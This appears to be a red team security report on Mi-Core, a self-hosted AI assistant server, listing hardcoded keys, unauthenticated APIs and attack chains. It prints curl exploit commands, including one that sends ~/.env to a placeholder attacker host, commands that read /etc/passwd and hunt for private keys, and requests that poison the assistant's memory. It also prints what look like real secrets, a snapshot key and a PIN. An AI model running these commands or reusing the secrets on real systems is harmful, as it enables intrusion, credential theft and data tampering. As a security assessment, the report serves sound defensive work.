# 🔴 RED TEAM SECURITY REPORT — Track R1

**Date:** 2026-06-15
**Target:** Mi-Core (mi-core)
**Red Team Status:** CRITICAL FINDINGS

---

## Executive Summary

Mi-Core has **11 critical** and **8 high-severity** security vulnerabilities that can lead to full system compromise, credential theft, and data exfiltration. The system is NOT ready for production use by an external-facing CEO.

---

## CRITICAL FINDINGS

### 🔴 C-01: Hardcoded API Key in Source Code (11 files)

**Severity:** CRITICAL
**Exploitable via:** Direct HTTP request

The API key `'mi-core-secret-2026'` is hardcoded as a fallback default in **11 files**:

| File | Line |
|------|------|
| `server/src/routes/gstack.ts` | `const API_KEY = process.env.MI_CORE_API_KEY \|\| 'mi-core-secret-2026'` |
| `server/src/routes/knowledge.ts` | Same pattern |
| `server/src/routes/jarvis.ts` | Same pattern |
| `server/src/graph/graph-router.ts` | Same pattern |
| `server/src/middleware/rate-limit.ts` | Same pattern |
| `server/src/gstack/skills/skill-registry.ts` | Same pattern |
| `server/src/gstack/role-agents/qa-agent.ts` | Same pattern |
| + 4 more files | Same pattern |

**Exploit:** If `MI_CORE_API_KEY` env var is unset (common in fresh deployments), ANY request with `x-api-key: mi-core-secret-2026` bypasses auth on 11 route groups including knowledge base, graph data, Jarvis internals, skill registry, and rate limiting.

**Attack vector:**
```
curl -H "x-api-key: mi-core-secret-2026" http://TARGET:4001/api/knowledge/search?q=all
curl -H "x-api-key: mi-core-secret-2026" http://TARGET:4001/api/graph/nodes
curl -H "x-api-key: mi-core-secret-2026" http://TARGET:4001/api/jarvis/status
```

**Why it's critical:** The key is in source code — anyone with repo access, a decompiled binary, or a leaked git history can authenticate to all protected endpoints.

---

### 🔴 C-02: Live Secrets in .env File on Disk

**Severity:** CRITICAL
**File:** `server/.env`

Live credentials found in plaintext:

```
ASANA_TOKEN=REDACTED_FOR_SECURITY
GOOGLE_CLIENT_ID=REDACTED_FOR_SECURITY
GOOGLE_CLIENT_SECRET=REDACTED_FOR_SECURITY
MI_SNAPSHOT_SECRET=ae5780c5d3aaf5fe1a431212c04de6b32c27e5f68ac9eb946464668ad896de95
MI_PIN=4452
```

**Risk:** Even though `.gitignore` now excludes it, the file exists on disk with real production credentials. Any backup, screenshot, or filesystem access exposes all secrets.

**Additional:** `server/client_secret_1051940384561-*.json` (Google OAuth client credentials) also exists on disk.

---

### 🔴 C-03: No Authentication on Memory API

**Severity:** CRITICAL
**File:** `server/src/routes/memory.ts`

All 14 memory endpoints are **completely unauthenticated**:

```
GET  /api/memory/profile      ← Owner's personal profile
GET  /api/memory/preferences  ← Owner's preferences
GET  /api/memory/business     ← Business context
GET  /api/memory/decisions    ← All decisions made
GET  /api/memory/personal     ← Personal/private context
GET  /api/memory/workflows    ← All workflow definitions
POST /api/memory/profile      ← OVERWRITE owner profile
POST /api/memory/personal     ← OVERWRITE personal data
DELETE /api/memory/personal   ← WIPE personal data
```

**Exploit:** Any device on the same network can:
1. Read the CEO's personal context, decisions, and preferences
2. Overwrite the owner's memory with poisoned data
3. Delete sensitive personal information

```bash
curl http://TARGET:4001/api/memory/profile
curl http://TARGET:4001/api/memory/personal
curl -X POST http://TARGET:4001/api/memory/profile -d '{"name":"Attacker","mode":"autonomous"}'
```

---

### 🔴 C-04: No Authentication on Workspace API

**Severity:** CRITICAL
**File:** `server/src/routes/workspace.ts`

All workspace endpoints are **completely unauthenticated**:

```
GET /api/workspace/projects        ← All project paths
GET /api/workspace/search?q=...    ← File search across filesystem
GET /api/workspace/processes       ← Running processes on host
GET /api/workspace/ports           ← All listening ports
GET /api/workspace/briefing        ← AI-powered workspace analysis
```

**Exploit:**
```bash
# List all running processes
curl http://TARGET:4001/api/workspace/processes

# Find all .env files on the system
curl "http://TARGET:4001/api/workspace/search?q=.env"

# Find all private keys
curl "http://TARGET:4001/api/workspace/search?q=id_rsa"

# See all open ports (reconnaissance)
curl http://TARGET:4001/api/workspace/ports
```

---

### 🔴 C-05: No Authentication on Profile API

**Severity:** CRITICAL
**File:** `server/src/routes/profile.ts`

The profile API exposes owner information without any auth:

```
GET /api/profile       ← Full owner profile (name, phone, company, preferences)
POST /api/profile      ← Overwrite owner profile
```

---

### 🔴 C-06: Node Command Execution Without Auth

**Severity:** CRITICAL
**File:** `server/src/routes/nodes.ts`

The nodes API exposes remote command execution:

```
GET  /api/nodes                    ← List all connected nodes
POST /api/nodes/:id/exec           ← Execute command on remote node
POST /api/nodes/:id/read           ← Read file from remote node
```

**Exploit:**
```bash
# List nodes
curl http://TARGET:4001/api/nodes

# Execute arbitrary command on a node
curl -X POST http://TARGET:4001/api/nodes/LAPTOP1/exec -d '{"cmd":"whoami"}'
curl -X POST http://TARGET:4001/api/nodes/LAPTOP1/exec -d '{"cmd":"cat /etc/passwd"}'
curl -X POST http://TARGET:4001/api/nodes/LAPTOP1/exec -d '{"cmd":"curl http://ATTACKER/steal?data=$(cat ~/.env)"}'
```

---

### 🔴 C-07: PIN Auth Bypass by Default

**Severity:** CRITICAL
**File:** `server/src/routes/auth.ts`

`requireAuth()` middleware is a **no-op when MI_PIN is unset**:

```typescript
if (!process.env.MI_PIN && !process.env.MI_PIN_HASH) {
  return next();  // ← BYPASSES ALL AUTH
}
```

In fresh deployments where `MI_PIN` is not configured, **all protected endpoints are wide open**.

---

### 🔴 C-08: Approval Queue is In-Memory Only

**Severity:** CRITICAL
**File:** `server/src/approval/gate.ts`

The entire approval queue is stored in a JavaScript `Map`:
- **Server restart = all pending approvals lost**
- **No audit trail persistence** — approval/rejection history is gone on restart
- A pending dangerous action (Level 3: gmail_send, file_delete) could be lost and re-triggered

---

### 🔴 C-09: Secret in Snapshot Auth Header

**Severity:** CRITICAL
**File:** `server/.env`

```
MI_SNAPSHOT_SECRET=ae5780c5d3aaf5fe1a431212c04de6b32c27e5f68ac9eb946464668ad896de95
```

This 64-character hex secret authenticates snapshot ingestion from the dashboard API. If leaked, an attacker can inject fake business data into Mi's intelligence layer.

---

### 🔴 C-10: CORS Allows LAN Subnets

**Severity:** CRITICAL (in network context)
**File:** `server/src/index.ts`

```typescript
cors({
  origin: (origin, cb) => {
    // Auto-allows 192.168.x.x, 10.x.x.x, 100.x.x.x
    if (/^https?:\/\/192\.168\.\d+\.\d+/.test(origin) || 
        /^https?:\/\/10\.\d+\.\d+\.\d+/.test(origin)) {
      return cb(null, true);
    }
  }
})
```

Any device on the local network can make cross-origin requests to Mi's API. Combined with C-03/C-04/C-05, this means any compromised device on the same WiFi can steal all data.

---

### 🔴 C-11: Google OAuth Client Secret on Disk

**Severity:** CRITICAL
**File:** `server/client_secret_1051940384561-*.json`

Full Google OAuth client credentials stored as a JSON file on disk. This gives full access to Gmail, Calendar, and Drive API access for the configured OAuth app.

---

## HIGH SEVERITY FINDINGS

### 🟠 H-01: WhatsApp PIN Brute Force — No Lockout on Gateway

The WhatsApp gateway (`POST /api/whatsapp/mi`) has rate limiting but no **credential-specific lockout**. An attacker can try API keys indefinitely — the rate limiter only limits requests/minute, not failed attempts.

### 🟠 H-02: Session Tokens in Memory

PIN-based session tokens (`auth.ts`) are stored in an in-memory `Set<string>`. Server restart = all sessions invalidated but also = no session history for audit.

### 🟠 H-03: Remote Auth Token in Query String

`remote-auth.ts` accepts tokens via `?token=` query parameter, which means tokens appear in server logs, browser history, and referrer headers.

### 🟠 H-04: Dashboard Snapshot Injection

The dashboard connector (`bigdata/connectors/dashboard/ingest.ts`) fetches data from `DASHBOARD_API_URL` with `MI_SNAPSHOT_SECRET` for auth. If the secret is compromised, fake data can be injected into the business intelligence layer.

### 🟠 H-05: PostgreSQL Credentials in .env

```
POSTGRES_HOST, POSTGRES_PORT, POSTGRES_DATABASE, POSTGRES_USER, POSTGRES_PASSWORD
```

Database credentials in plaintext .env file. No connection encryption enforcement.

### 🟠 H-06: MinIO/S3 Credentials in .env

```
MINIO_ENDPOINT, MINIO_ROOT_USER, MINIO_ROOT_PASSWORD
```

Object storage credentials in plaintext.

### 🟠 H-07: No Input Sanitization on Memory Writes

`POST /api/memory/personal`, `POST /api/memory/profile` accept arbitrary JSON body — no schema validation, no sanitization. An attacker can inject poisoned memories that corrupt Mi's decision-making.

### 🟠 H-08: QB Database Direct Access

`bigdata/connectors/quickbooks/ingest.ts` reads the QuickBooks SQLite database directly. The `QB_DB_PATH` env var points to a local file. Any process with filesystem access can read financial data.

---

## ATTACK CHAINS

### Chain 1: Full System Compromise (LAN)
```
1. Join same WiFi network
2. curl http://TARGET:4001/api/workspace/processes  → Learn running services
3. curl http://TARGET:4001/api/workspace/search?q=.env  → Find credential files
4. curl http://TARGET:4001/api/memory/personal  → Steal personal data
5. curl -X POST http://TARGET:4001/api/memory/personal -d '{"context":"...poisoned..."}'  → Inject false memories
6. curl -X POST http://TARGET:4001/api/nodes/LAPTOP1/exec -d '{"cmd":"malicious"}'  → Execute on remote nodes
```

### Chain 2: Credential Theft via Default API Key
```
1. Use hardcoded fallback key: mi-core-secret-2026
2. curl -H "x-api-key: mi-core-secret-2026" http://TARGET:4001/api/knowledge/search?q=secret
3. curl -H "x-api-key: mi-core-secret-2026" http://TARGET:4001/api/graph/nodes
4. Access all 11 protected route groups without any real credentials
```

### Chain 3: Data Injection via Unauthenticated APIs
```
1. curl -X POST http://TARGET:4001/api/memory/business -d '{"stores":[{"name":"Fake","revenue":999999}]}'
2. Mi now believes fake business data and may make wrong CEO recommendations
3. Next morning briefing includes fabricated data
```

---

## SECRET INVENTORY

| Secret | Location | Risk |
|--------|----------|------|
| `mi-core-secret-2026` (API key default) | 11 source files | Full auth bypass |
| `ASANA_TOKEN` | server/.env | Asana workspace access |
| `GOOGLE_CLIENT_ID` | server/.env | OAuth identity |
| `GOOGLE_CLIENT_SECRET` | server/.env | Full Google API access |
| `MI_SNAPSHOT_SECRET` | server/.env | Business data injection |
| `MI_PIN=4452` | server/.env | Remote access PIN |
| Google OAuth client JSON | server/client_secret_*.json | Gmail/Calendar/Drive |
| `POSTGRES_PASSWORD` | server/.env | Database access |
| `MINIO_ROOT_PASSWORD` | server/.env | Object storage access |

---

## VERDICT

**Security Score: 2/10**

Mi-Core exposes **9 unauthenticated API groups** with access to personal data, filesystem info, process lists, remote command execution, and memory manipulation. The hardcoded API key default provides auth bypass on 11 additional route groups. No prompt injection protection exists. No input sanitization on memory writes. Approval queue is non-durable.

**A LAN attacker can achieve full system compromise in under 60 seconds.**
